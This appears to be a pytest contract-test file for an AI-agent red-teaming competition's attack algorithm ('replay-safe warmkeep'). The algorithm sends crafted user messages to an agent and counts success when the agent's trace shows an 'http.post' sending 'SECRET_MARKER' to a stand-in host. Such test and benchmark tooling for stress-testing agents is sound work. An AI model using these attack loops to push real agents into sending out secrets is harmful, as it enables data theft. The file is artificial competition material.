"""Contract tests for the B012 replay-safe warmkeep candidate."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B012_ATTACK_PATH = Path("baselines/replaysafe_warmkeep_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b012_only_retains_fired_warmup() -> None:
    b008 = _load_attack(B008_ATTACK_PATH, "replaysafe_classify5_attack_for_b012_compare")
    b012 = _load_attack(B012_ATTACK_PATH, "replaysafe_warmkeep_attack")

    assert b012.SPLIT_CLASSIFY_N == b008.SPLIT_CLASSIFY_N == 5
    assert b012.SPLIT_THRESHOLD_S == b008.SPLIT_THRESHOLD_S == 12.0
    assert b012.REPLAY_SAFE_FRAC == b008.REPLAY_SAFE_FRAC == 0.99
    assert b012.SLOW_MULTIPOST_N == b008.SLOW_MULTIPOST_N == 4
    assert b012.PROBE_HOPS == b008.PROBE_HOPS == 0
    assert b012.BURST_K == b008.BURST_K == 1
    assert b012.TEMPLATE == b008.TEMPLATE
    assert b012.FRAME_TEMPLATE == b008.FRAME_TEMPLATE
    assert b012.WARMUP_IDX == b008.WARMUP_IDX
    assert b012.KEEP_WARMUP_FIRED is True


def test_fired_warmup_is_returned_as_replay_safe_candidate(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    b008 = _load_attack(B008_ATTACK_PATH, "replaysafe_classify5_attack_for_warmkeep_count")
    b012 = _load_attack(B012_ATTACK_PATH, "replaysafe_warmkeep_attack_count")

    b008_clock = FakeClock()
    monkeypatch.setattr(b008.time, "monotonic", b008_clock)
    b008_candidates = b008.AttackAlgorithm().run(
        FiringEnv(b008_clock, latency_s=13.0),
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    b012_clock = FakeClock()
    monkeypatch.setattr(b012.time, "monotonic", b012_clock)
    b012_env = FiringEnv(b012_clock, latency_s=13.0)
    b012_candidates = b012.AttackAlgorithm().run(
        b012_env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    messages = [candidate.user_messages[0] for candidate in b012_candidates]
    assert len(b012_candidates) == len(b008_candidates) + 1
    assert messages[0] == b012._message(b012.WARMUP_IDX)
    assert ".invalid" in messages[0]
    assert set(b012_env.hops) == {8}


def test_non_firing_warmup_is_not_returned(monkeypatch: pytest.MonkeyPatch) -> None:
    b012 = _load_attack(B012_ATTACK_PATH, "replaysafe_warmkeep_attack_nonfiring")

    class NonFiringEnv(FiringEnv):
        def export_trace_dict(self):
            return {"tool_events": []}

    clock = FakeClock()
    monkeypatch.setattr(b012.time, "monotonic", clock)
    candidates = b012.AttackAlgorithm().run(
        NonFiringEnv(clock, latency_s=13.0),
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    messages = [candidate.user_messages[0] for candidate in candidates]
    assert b012._message(b012.WARMUP_IDX) not in messages
